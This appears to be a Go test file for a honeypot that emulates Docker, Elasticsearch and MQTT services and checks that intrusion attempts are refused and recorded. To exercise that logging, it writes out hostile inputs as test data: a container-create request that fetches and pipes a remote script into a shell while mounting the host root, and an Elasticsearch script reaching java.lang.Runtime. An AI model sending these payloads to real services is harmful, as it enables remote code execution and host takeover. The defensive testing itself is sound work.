package sim

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/blocksberghexhex/badbot/intern/puffer"
)

func anfrage(t *testing.T, methode, url, body string, kopf map[string]string) (int, http.Header, string) {
	t.Helper()
	r, _ := http.NewRequest(methode, url, strings.NewReader(body))
	for k, v := range kopf {
		r.Header.Set(k, v)
	}
	resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(r)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, resp.Header, string(b)
}

func TestDocker(t *testing.T) {
	s := make(sammler, 10)
	d := &Docker{Version: "20.10.7", Port: 2375, Melde: func(b puffer.Beobachtung) { s <- b }}
	ln, _ := net.Listen("tcp", "127.0.0.1:0")
	srv := HTTPDienst(ln, d)
	defer srv.Close()
	basis := "http://" + ln.Addr().String()

	code, kopf, body := anfrage(t, "GET", basis+"/_ping", "", nil)
	if code != 200 || body != "OK" || kopf.Get("Api-Version") != "1.41" || kopf.Get("Server") != "Docker/20.10.7 (linux)" {
		t.Fatalf("_ping: %d %q %v", code, body, kopf)
	}
	probeJSON(t, s.naechste(t))
	code, _, body = anfrage(t, "GET", basis+"/v1.41/version", "", nil)
	var v map[string]any
	if json.Unmarshal([]byte(body), &v); code != 200 || v["Version"] != "20.10.7" || v["ApiVersion"] != "1.41" {
		t.Fatalf("version: %d %s", code, body)
	}
	if strings.Contains(probeJSON(t, s.naechste(t)), "kommandos") {
		t.Fatal("Lesen als Absicht gezaehlt")
	}
	if code, _, body = anfrage(t, "GET", basis+"/containers/json", "", nil); code != 200 || strings.TrimSpace(body) != "[]" {
		t.Fatalf("containers: %d %s", code, body)
	}
	s.naechste(t)

	// Container anlegen: abgewiesen, das Abbild steht in der Stichprobe.
	code, _, body = anfrage(t, "POST", basis+"/v1.41/containers/create",
		`{"Image":"alpine:latest","Cmd":["sh","-c","wget http://example.org/x | sh"],"HostConfig":{"Binds":["/:/mnt"]}}`,
		map[string]string{"Content-Type": "application/json"})
	if code != 403 || !strings.Contains(body, "authorization denied") || strings.Contains(body, "alpine") {
		t.Fatalf("create: %d %s", code, body)
	}
	enthaelt(t, probeJSON(t, s.naechste(t)), `"kommandos":["POST /containers/create alpine:latest"]`, `"body":["{\"Image\"`)
}

func TestElasticsearch(t *testing.T) {
	s := make(sammler, 10)
	e := &Elastic{Version: "7.10.2", Port: 9200, Melde: func(b puffer.Beobachtung) { s <- b }}
	ln, _ := net.Listen("tcp", "127.0.0.1:0")
	srv := HTTPDienst(ln, e)
	defer srv.Close()
	basis := "http://" + ln.Addr().String()

	code, _, body := anfrage(t, "GET", basis+"/", "", nil)
	if code != 200 || !strings.Contains(body, `"number":"7.10.2"`) || !strings.Contains(body, `"lucene_version":"8.7.0"`) || !strings.Contains(body, "You Know, for Search") {
		t.Fatalf("/: %d %s", code, body)
	}
	if strings.Contains(probeJSON(t, s.naechste(t)), "kommandos") {
		t.Fatal("Lesen als Absicht gezaehlt")
	}
	// Ein unbekannter Index: feste Antwort, ohne den Namen zurueckzugeben.
	code, _, body = anfrage(t, "GET", basis+"/kunden_2026/_search", "", nil)
	if code != 404 || strings.Contains(body, "kunden") {
		t.Fatalf("Index: %d %s", code, body)
	}
	s.naechste(t)
	// Skript und Zugangsdaten: abgewiesen, Absicht und Anmeldung festgehalten.
	code, _, body = anfrage(t, "POST", basis+"/_search", `{"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\")"}}}`,
		map[string]string{"Authorization": "Basic ZWxhc3RpYzo=", "Content-Type": "application/json"})
	if code != 403 || !strings.Contains(body, "security_exception") {
		t.Fatalf("Skript: %d %s", code, body)
	}
	enthaelt(t, probeJSON(t, s.naechste(t)), `"kommandos":["POST /_search"]`, `"name":"elastic"`)

	auth := "Basic " + b64("elastic:"+geheim)
	anfrage(t, "GET", basis+"/", "", map[string]string{"Authorization": auth})
	enthaelt(t, probeJSON(t, s.naechste(t)), `"passwort_sha256"`)
}

func mqttPaket(stufe byte, client, name, pw string) []byte {
	var p bytes.Buffer
	text := func(s string) {
		binary.Write(&p, binary.BigEndian, uint16(len(s)))
		p.WriteString(s)
	}
	text("MQTT")
	p.WriteByte(stufe)
	var flags byte = 0x02
	if name != "" {
		flags |= 0x80
	}
	if pw != "" {
		flags |= 0x40
	}
	p.WriteByte(flags)
	p.Write([]byte{0, 60})
	if stufe == 5 {
		p.Write([]byte{0x05, 0x11, 0, 0, 0, 10}) // Eigenschaften: Sitzungsdauer
	}
	text(client)
	if name != "" {
		text(name)
	}
	if pw != "" {
		text(pw)
	}
	return append([]byte{0x10, byte(p.Len())}, p.Bytes()...)
}

func TestMQTT(t *testing.T) {
	a, s := starte(t, "mqtt", MQTT())
	for _, f := range []struct {
		stufe   byte
		connack []byte
	}{{4, []byte{0x20, 0x02, 0x00, 0x05}}, {5, []byte{0x20, 0x03, 0x00, 0x87, 0x00}}} {
		c := verbinde(t, a)
		c.Write(mqttPaket(f.stufe, "mosq-abc", "admin", geheim))
		antwort, _ := io.ReadAll(c)
		c.Close()
		if !bytes.Equal(antwort, f.connack) {
			t.Fatalf("Stufe %d: CONNACK %x", f.stufe, antwort)
		}
		enthaelt(t, probeJSON(t, s.naechste(t)), `"client":["mosq-abc"]`, `"name":"admin"`, `"passwort_laenge":17`)
	}
	// Ohne Zugangsdaten: keine Anmeldung in der Stichprobe.
	c := verbinde(t, a)
	c.Write(mqttPaket(4, "scanner", "", ""))
	io.ReadAll(c)
	c.Close()
	if strings.Contains(probeJSON(t, s.naechste(t)), "anmeldungen") {
		t.Fatal("anonyme Verbindung als Anmeldung gezaehlt")
	}
}

// TestMQTTKaputtePakete: Laengenangaben ueber das Paketende hinaus fuehren
// zu einem Fehler, nie zu einer Panik.
func TestMQTTKaputtePakete(t *testing.T) {
	gut := mqttPaket(5, "x", "n", "p")
	for i := 2; i < len(gut); i++ {
		kaputt := append([]byte(nil), gut...)
		kaputt[i] = 0xff
		mqttConnect(bytes.NewReader(kaputt))
		mqttConnect(bytes.NewReader(gut[:i]))
	}
	if c, err := mqttConnect(bytes.NewReader([]byte("GET / HTTP/1.1\r\n"))); err == nil || c == nil {
		t.Fatal("HTTP als MQTT angenommen")
	}
}

func TestErscheinungWirdErgaenzt(t *testing.T) {
	pfad := filepath.Join(t.TempDir(), "erscheinung.json")
	os.WriteFile(pfad, []byte(`{"ssh":"SSH-2.0-OpenSSH_7.4","nginx":"nginx/1.14.0","smtp":"x","ftp":"y","mysql":"5.7.36","redis":"5.0.7"}`), 0o600)
	e, err := ErscheinungLaden(pfad)
	if err != nil || e.SSH != "SSH-2.0-OpenSSH_7.4" || e.Docker == "" || e.Elastic == "" {
		t.Fatalf("%+v %v", e, err)
	}
	if e2, _ := ErscheinungLaden(pfad); e2 != e {
		t.Fatal("Ergaenzung nicht gespeichert")
	}
}

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }
